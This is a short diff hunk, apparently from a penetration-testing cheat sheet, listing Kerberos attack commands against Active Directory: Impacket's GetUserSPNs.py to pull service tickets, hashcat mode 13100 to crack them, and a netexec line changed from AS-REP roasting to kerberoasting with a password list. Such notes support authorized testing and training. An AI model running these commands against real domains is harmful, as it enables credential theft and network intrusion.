@@ -4,4 +4,4 @@ GetUserSPNs.py DOMAIN/username:password -dc-ip <DC_IP> OR GetUserSPNs.py DOMAIN/
 
 hashcat -m 13100 spn_hashes.txt wordlist.txt
 
-netexec kerberos <target_ip> -u users.txt --asreproast
+netexec kerberos <target_ip> -u users.txt -p passwords.txt --kerberoast
